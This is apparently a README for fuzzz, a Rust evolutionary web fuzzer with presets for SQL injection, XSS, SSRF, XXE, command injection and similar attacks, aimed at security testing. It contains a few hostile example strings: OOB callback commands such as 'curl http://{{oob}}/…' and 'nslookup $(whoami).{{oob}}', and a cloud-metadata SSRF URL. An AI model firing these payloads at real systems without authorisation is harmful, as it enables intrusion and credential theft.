# fuzzz

An evolutionary web-fuzzer engine in Rust. Probe payloads are **generated** from an
atom-chain grammar and **mutated** by a havoc stage, and the blend between the two is
steered by **response-signal feedback**: anything that produces an interesting response
is kept in a corpus, given energy, and used as the parent of further probes. The engine
itself is transport-agnostic — a `Probe` trait is the only thing it needs — fully
deterministic on replay, and usable both as a library and through a set of CLI runners
against live targets. It is the fuzzing core of [re:Vise](https://github.com/MamiyaTakuji2005/re-Vise),
spun out into its own crate.

```
seeds / payload table
        │
        ▼
    SeedCorpus ──────► parent payload
        │                      │
        │      ┌───────────────┴───────────────┐
        │      ▼                               ▼
        │  generation (gen_ratio)        havoc (1 − gen_ratio)
        │  atoms → ChainTable →         12 stochastic ops ×
        │  WeightedSampler              ops_per_step
        │      └────────────┬──────────────┘
        │                   ▼
        │          EvolutionaryLoop ──► Probe ──► target
        │                   │
        │                   ▼
        │        classifiers × BaselineProfile
        │                   │
        └────── feedback ◄──┘
          (interesting entries get boosted energy and mutate more)
```

## The pieces

**`evolutionary/atoms.rs`** is the vocabulary and the grammar. 46 web-attack atoms —
SQL quotes and keywords, XSS brackets, template delimiters, command-injection
characters, traversal sequences, encoding primitives — plus 20 numeric atoms for
parameter fuzzing. `ChainTable` is a sparse `(from, to) → weight` map; missing pairs
default to 1.0, and `compile()` precomputes cumulative distributions so sampling from
`WeightedSampler` is allocation-free. `PlacementPolicy` decides where a generated chain
lands (append / prepend / wrap) and `LengthPolicy` stops it with a geometric
probability (`short`, `medium`, `long`, `fixed(n)`).

**`evolutionary/havoc.rs`** is the mutation stage: 12 stochastic operators (insert,
replace, delete, duplicate, splice, URL-encode, boundary-value insert, repeat, wrap,
reverse, uppercase), each with a public weight in `HavocSchedule`. The defaults are
calibrated — `ops_per_step` is 1 so a candidate stays near its seed, replacing tokens is
down-weighted (it pushes payloads off their trigger) and repeating payloads is
up-weighted (it keeps the trigger intact). All string slicing is UTF-8 safe.

**`evolutionary/corpus.rs`** is the memory of what worked. `SeedCorpus` never removes
entries; each entry carries an energy score (cap 64) and is drawn as a mutation parent
proportional to it, so a payload that fired a signal keeps spawning children. Energy
growth is a `BoostMode`: additive (default), flat, multiplicative, or none. Feedback
comes through a `Feedback` trait; the built-in `HttpFeedback` scores signals 0–6 and
*confirms* a hit on DBMS errors, leak signatures, time delays, literal reflection, a
≥500 status delta, or a prototype-pollution gadget.

**`signals/`** turns raw responses into statements. The classifiers in
`signal.rs` cover status, size, reflection (literal / percent-encoded / HTML-encoded),
time-delay, body-diff, DBMS and Node error families, per-class body signatures
(`root:x:0:0` for file read, `AccessKeyId` for cloud metadata), the json-spaces
prototype-pollution gadget, and a novelty/anomaly fingerprint. `baseline.rs` runs a
`BaselineProfile`: an empty-payload request first, whose ambient signals are filtered
out of every probe result, with variant-specific matching (status class + direction,
error family + snippet, magnitude) rather than "any difference counts".

**`evolutionary/evolution.rs`** is the loop that spends the budget: per probe it blends
generation and havoc according to `gen_ratio` (0.0 = pure mutation, 1.0 = pure
generation, 0.7 default), with configurable timeout, dedup, payload-length cap, and
no-op retries. The RNG is dual-mode (`rng.rs`): `SmallRng` for throughput, and
`ChaCha12Rng` — stable across platforms and toolchain versions — for replay; a seed
fixes the stream either way.

**`agent.rs`** is the high-level public API: a `Fuzzer<P: Probe>` builder that combines
a vulnerability preset, a `FuzzMode`, an injection point, and a transport, then runs and
returns `FuzzResult` with hits and diagnostics. The `fuzz` CLI is a thin wrapper around
it; a custom `Probe` is all you need to fuzz anything that isn't HTTP.

## Presets & payloads

Nine vulnerability presets, each with its own curated payload corpus, focused grammar,
and detector set. The corpora live as `payload_data/*.json` (~600 payloads total) with
per-payload metadata — context, encoding, severity, target technologies, description —
that carries through to results:

| `class` | preset | payloads | corpus covers |
|---------|--------|---------:|---------------|
| `sqli` | SQL injection | 112 | error / boolean / UNION / time / stacked, per DBMS |
| `xss` | cross-site scripting | 80 | script, img, svg, iframe, attribute contexts |
| `ssti` | template injection | 61 | Jinja2, Thymeleaf, ERB, FreeMarker, … |
| `cmdi` | command injection | 69 | pipe, semicolon, backtick, subshell, OOB |
| `path` | path traversal | 61 | dot-dot-slash and encoding variants |
| `nosql` | NoSQL injection | 86 | MongoDB `$gt` / `$ne` / `$regex` / `$where`, … |
| `ssrf` | server-side request forgery | 56 | cloud metadata, localhost, loopback bypasses, OOB |
| `xxe` | XML external entities | 31 | inline + OOB exfil |
| `proto` | prototype pollution | 45 | detection gadgets (not blind pollution) |

Presets are thin on purpose: they pair a table, an atom grammar, a signal set, and a
`gen_ratio`. The ratios are calibrated per class — `sqli`/`xss`/`ssti` run hot at 0.8,
`cmdi`/`path`/`nosql` at 0.7, while `ssrf` and `xxe` are *pure havoc* (0.0): generation
doesn't help when the payload is a URL or a structured XML document. The default
`gen_ratio` of 0.7 is the safe middle.

`FuzzMode` decides *how* the budget is spent: `Table` walks the payload table once with
no randomness (predictable first-pass coverage), `TableThenEvolutionary` sweeps the
table and then evolves from whatever was interesting, `Evolutionary` is pure
corpus-driven search (default), and `InputsOnly` fires exactly the payloads you gave it.

## Quick start

The `fuzz` CLI is the fastest path to a live target — a preset, a URL, an injection
point, and a budget:

```
cargo run --bin fuzz --features http --release -- \
    --preset sqli --url 'https://target/item.php' --inject-query id --budget 300
```

As a library, the same run is one builder chain — `HttpProbe` is the real-HTTP
transport behind the `http` feature; anything implementing `Probe` works, mock or real:

```rust
use std::sync::Arc;
use std::time::Duration;
use fuzzz::agent::{Fuzzer, FuzzMode};
use fuzzz::http::HttpProbe; // behind the `http` feature — or implement Probe yourself

let probe = Arc::new(HttpProbe::new(Duration::from_secs(15)));
let result = Fuzzer::new(probe)
    .sql_injection()
    .mode(FuzzMode::Evolutionary)
    .target("https://target/item.php?id=1", "GET")
    .inject_query("id")
    .budget(300)
    .replay_seed(42)          // deterministic replay
    .run().await?;

println!("confirmed: {:?}", result.confirmed);
```

For the low-level engine (your own atoms, chains, feedback, and transport), the
`digits` example is a complete annotated walkthrough: a mock target hiding "42" and "7"
inside a digit vocabulary, discovered by pure generation in 30 probes.

```
cargo run --example digits
```

## The `fuzz` CLI

A headless single-URL runner. Its report is mechanics-first — baseline profile, probes
sent, every signal observed (confirmed or merely interesting) — so the
request → baseline-diff → classify pipeline stays visible even when nothing confirms.
Run `cargo run --bin fuzz --features http -- --help` for the full grouped help; the
shape is:

```
fuzz --preset <class|path> --url <URL> [options]

  --preset <class|path>    Built-in class (sqli xss ssti cmdi path nosql ssrf xxe proto)
                           or a path to an external module .json — see below.
  --inject-query <param>   Inject {{payload}} into a query parameter.
  --inject-body <tmpl>     …or a form-body template containing {{payload}}.
  --inject-body-file <p>   …same, read from a file (preserves trailing newlines —
                           NDJSON _bulk-style bodies need this).
  --inject-json            …or the payload IS the whole application/json body.
  --budget <n>             Probe budget (default 100).
  --mode <m>               evolutionary | table | table-then-evo | inputs-only.
  --concurrency <n>        In-flight probes (default 1); --rate-limit <rps> caps it.
  --seed <u64>             Fix the RNG for deterministic replay.
  --hunt                   Recall-first: also flag responses unlike the baseline.
  --jsonl                  One JSON object per hit on stdout — pipe into jq.
  --header / --cookie      Session flags carried into EVERY request, baseline included.
  --csrf-url <URL>         Refresh a CSRF token per request (cookie store on).
  --oob-url <collab>       OOB collaborator for {{oob}} payloads.
```

The injection flags are mutually exclusive; if several are present the precedence is
JSON body → body template → query. `--header` is repeatable and, with `--cookie`, gets
you behind logins (DVWA-style). `--jsonl` keeps stdout machine-readable for piping into
jq or a spider loop that maps endpoints → fuzzes each → collects the findings.

## One campaign, one file: module presets

`--preset` is dual-purpose: a known class name selects the compiled-in preset, anything
else is a path to a module `.json`. A module is a **diff over a base class**: it names a
`class` (which supplies detectors, feedback, and any section the file omits) and then
overrides the data half — `grammar` (`atoms`, `chain`, `placement`, `length`),
`payloads`, `gen_ratio`, `shells`. "My seeds but the hardcoded atoms" is just an omitted
`grammar` section. Grammar and payloads stay separate sections in one file so either can
be dropped without inventing a second format:

```json
{
  "class": "ssrf",
  "name": "ssrf-cloud-metadata",
  "description": "SSRF sweep tuned for cloud metadata endpoints and loopback bypasses.",
  "signals": ["status", "body-signature:cloud"],
  "grammar": {
    "atoms": ["http://", "169.254.169.254", "metadata", "%2e", "…"],
    "chain": { "metadata": { "/latest/": 3.0 } }
  },
  "payloads": [ { "value": "http://169.254.169.254/latest/meta-data/", "…": "…" } ]
}
```

A non-empty `signals` array makes the module **self-contained** — it names its own
detectors, resolved by name through the registry (`status`, `size`, `reflection`,
`time-delay`, `body-diff`, `proto-pollution`, `error:dbms`, `error:nodejs`,
`body-signature:file`, `body-signature:cloud`, `novelty`) and replaces the class's set.
Omit it to inherit. Feedback still comes from the base class. `examples/ssrf-cloud-metadata.json`
is a worked example — and a class name shadows a same-named file, so `./name.json`
forces the file.

## Out-of-band payloads: `{{oob}}`

Payloads that need a callback — blind command injection, OOB XXE, SSRF, DNS exfil —
carry the placeholder `{{oob}}`, which is a **bare host**, not a URL: the payload writes
its own scheme (`curl http://{{oob}}/…`, `nslookup $(whoami).{{oob}}`). Supply the
collaborator with `--oob-url <url-or-host>` (the `{{interactsh-url}}` alias is accepted)
and it is substituted at injection time. Without it, OOB payloads are skipped and
reported to stderr — never sent as dead probes. The placeholder is a host rather than a
URL so one collaborator value works across payloads that disagree about their scheme and
path.

## The GUI workbench: `fuzz-gui`

`fuzz-gui` (`--features gui`) is the interactive side: all nine presets, the four fuzz
modes, the injection points, per-request timeout, an OOB collaborator field, and
stop-on-first-hit, with progress reporting and cancellation. It drives the same
`Fuzzer` builder the CLI does.

> **Prototype pollution is invasive.** The `proto` preset confirms with detection
> gadgets rather than blind pollution — the json-spaces gadget makes a vulnerable app's
> response JSON re-indent, which the classifier catches as a whitespace-only diff. A
> successful gadget pollutes the live application persistently until it restarts. Treat
> a PP run as you would a destructive payload.

## Recall-first hunting

Fuzzing for signatures is precision-first: you only find what you know to look for.
`--hunt` (or `Fuzzer::hunt()`) bolts on `NoveltyClassifier`, which fingerprints every
response as `(status, size, words, lines)` and flags anything unlike the baseline as an
*anomaly* — reported, never confirmed. It surfaces unusual responses even when no
vulnerability signature matches. The design rationale — why this engine deliberately
wants recall where ffuf-style tools want precision — is written up in
[`ANOMALY.md`](ANOMALY.md), with the recall-first comments in `signal.rs`,
`baseline.rs`, `corpus.rs`, and `bin/fuzz.rs` pointing back to it.

## Determinism & concurrency

A run is a function of (seed, concurrency). `--seed <u64>` fixes the RNG stream: the
same seed and the same `--concurrency` reproduce the same candidate sequence, and
`--concurrency 1` is bit-exact sequential replay on a given build. For replay that is
stable across platforms and toolchain versions, opt into `ChaCha12` at the engine level
(`EvolutionaryLoop::with_rng_mode`) — a seed with the default `SmallRng` is
deterministic only for the same rand version. The sweeps and the regression test lean
on this to keep calibration numbers reproducible.

The real HTTP transport opens a **fresh connection per probe** by default: fuzzing
benefits from the target not being able to serialize all probes down one persistent
pipe. Targets that throttle connection churn, or that need session state across probes,
can opt into keepalive via the `keepalive` feature.

## Calibration

The engine is tuned against offline mock targets — TOML-described servers in
`targets.toml` (`sqli`, `xss`, `cmdi`, `ssti`, `sqli-strict`, `xss-reflected`, `ssrf`,
`path-traversal`, plus a `waf-blocked` negative control) — so every knob is swept on
deterministic, network-free runs:

```
cargo run --bin calibrate --release -- targets.toml
```

The sweeps settled on: **conservative payloads win** — short chains and few mutation
ops stay in the high-signal neighborhood of a good seed, append beats prepend, and a
shared giant atom table actively hurts (each class gets a focused grammar instead of
the full vocabulary). Three mock-harness bugs had been hiding real engine behavior —
payload truncation at `=`, and leak-based classes (path traversal, SSRF) whose mock
bodies were too small for the size classifier to fire; the first is fixed, the second by
leak-body mocks plus the `BodySignatureClassifier`, and all three formerly-zero targets
now confirm roughly nine probes in ten. `tests/calibration.rs` is the regression guard:
it replays every target at fixed seeds and fails the build if a target falls below its
hit-rate floor or `waf-blocked` ever fires.

## Repo layout

The crate root is `Cargo.toml`; run cargo from the repo root.

* `src/agent.rs` — `Fuzzer` builder: presets, modes, injection points (main public API).
* `src/evolutionary/` — the engine: `atoms.rs`, `havoc.rs`, `corpus.rs`, `evolution.rs`, `rng.rs`.
* `src/signals/` — classifiers (`signal.rs`), the name→classifier registry, the signal-guided mutator.
* `src/baseline.rs` — ambient-signal filtering (the null hypothesis).
* `src/payloads.rs` + `src/payload_data/*.json` — the curated corpus (~600 payloads).
* `src/module.rs` — external module-file schema.
* `src/mock_config.rs` — TOML mock targets for offline calibration.
* `src/http.rs` — real HTTP transport behind the `http` feature (reqwest).
* `src/bin/` — the CLIs, see below.
* `examples/` — `digits.rs` (engine walkthrough), `ssrf-cloud-metadata.json` (module example).
* `tests/calibration.rs` — deterministic calibration regression guard.

| binary | feature | what it is |
|--------|---------|------------|
| `fuzz` | `http` | headless single-URL runner against a live target |
| `fuzz-gui` | `gui` | interactive egui workbench over the same builder |
| `calibrate` | — | full calibration sweep over `targets.toml`, hits per 1k |
| `stress` | — | extended stress suite over `stress_targets.toml` |
| `sweep` | — | corpus-size × vocabulary-size grid, CSV output |
| `signal_sweep` | — | does each preset's detector set actually fire on its target? |
| `atom_audit` | — | which atoms never make it into generated payloads |
| `cap_sweep` | — | energy-cap sweep |
| `havoc_ablation` | — | zero each havoc op in turn, measure the hit delta |
| `bench` | — | speed benchmark (quiet / noisy / heavy targets) |
| `report` | — | throughput, discovery, waste, and replay report suite |

## Build & test

```
cargo check                              # type-check (fast)
cargo test                               # unit tests + calibration regression guard
cargo test --test calibration -- --nocapture   # per-target hit rates (deterministic)
cargo run --bin calibrate --release -- targets.toml   # full calibration sweep
cargo run --bin fuzz --features http --release -- --help
cargo run --bin fuzz-gui --features gui --release
cargo run --bin report --release         # benchmark & report suite
```

The crate builds clean with no features — the engine, mock probes, and calibration all
run offline. Features add transport on top: `http` (reqwest, powers `fuzz`), `keepalive`
(connection reuse for session-y targets), and `gui` (egui, powers `fuzz-gui`). The
release profile is size-optimized (`opt-level = "z"`, LTO, one codegen unit, stripped).

## License & attribution

MIT — see `Cargo.toml`. No `LICENSE` file yet; the copyright line is still "re:Vise
Team" from the extraction.

**On the name.** The engine began inside
[re:Vise](https://github.com/MamiyaTakuji2005/re-Vise), where it evolved payloads
against a live-target harness; the engine itself was transport-independent and worth
having on its own. It was extracted into this crate under the working name
`auto-fuzz` — the name you still see on local checkouts and older calibration notes —
and renamed `fuzzz` when it got its own repository. Old notes that say `auto-fuzz`
mean this crate.
